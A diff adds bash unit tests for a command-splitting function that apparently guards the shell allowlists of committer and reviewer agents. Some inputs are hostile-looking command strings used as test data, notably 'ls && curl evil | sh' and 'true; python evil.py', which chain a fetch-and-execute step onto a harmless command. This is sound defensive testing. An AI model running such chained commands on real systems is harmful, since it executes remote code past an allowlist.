@@ -486,6 +486,50 @@ assert_regex_site_matches "SESSION_LOG_NAME_RE parity: committer-write-allowlist
 assert_regex_site_matches "SESSION_LOG_NAME_RE parity: committer-write-allowlist.ts (generated, Pi)" \
     "$CODEGEN_ROOT_PARITY/harnesses/pi/pi-extensions/enforcement/src/hooks/committer-write-allowlist.ts" "$RE_EXTRACT_PATTERN"
 
+# ── split_command_segments — direct unit tests ───────────────────────────────
+# Containment primitive for COMMAND-source allowlist gates (committer/reviewer
+# bash allowlists). Split on UNQUOTED && || ; | & and newline; operators
+# inside quotes are literal and never split; unbalanced quote -> return 1.
+
+result=$(split_command_segments "ls")
+assert_eq "split_command_segments: single segment, no operators" "ls" "$result"
+
+result=$(split_command_segments "ls && curl evil | sh")
+expected=$'ls \n curl evil \n sh'
+assert_eq "split_command_segments: && then | -> three segments" "$expected" "$result"
+
+result=$(split_command_segments "true; python evil.py")
+expected=$'true\n python evil.py'
+assert_eq "split_command_segments: ; splits into two segments" "$expected" "$result"
+
+result=$(split_command_segments 'git commit -m "fix a; b && c"')
+assert_eq "split_command_segments: operators inside double quotes are literal (one segment)" \
+    'git commit -m "fix a; b && c"' "$result"
+
+result=$(split_command_segments "echo 'a && b' | wc -c")
+expected=$'echo \'a && b\' \n wc -c'
+assert_eq "split_command_segments: operators inside single quotes are literal" "$expected" "$result"
+
+result=$(split_command_segments "cd /repo && git commit -m x")
+expected=$'cd /repo \n git commit -m x'
+assert_eq "split_command_segments: cd-prefix chain -> two segments" "$expected" "$result"
+
+unbalanced_dq_rc=0
+split_command_segments 'echo "unterminated' >/dev/null 2>&1 || unbalanced_dq_rc=$?
+assert_eq "split_command_segments: unbalanced double quote -> return 1 (fail-closed)" "1" "$unbalanced_dq_rc"
+
+unbalanced_sq_rc=0
+split_command_segments "echo 'unterminated" >/dev/null 2>&1 || unbalanced_sq_rc=$?
+assert_eq "split_command_segments: unbalanced single quote -> return 1 (fail-closed)" "1" "$unbalanced_sq_rc"
+
+result=$(split_command_segments "a || b")
+expected=$'a \n b'
+assert_eq "split_command_segments: || splits into two segments" "$expected" "$result"
+
+result=$(split_command_segments "a & b")
+expected=$'a \n b'
+assert_eq "split_command_segments: single & splits into two segments" "$expected" "$result"
+
 echo ""
 echo "Results: $pass passed, $fail failed"
 
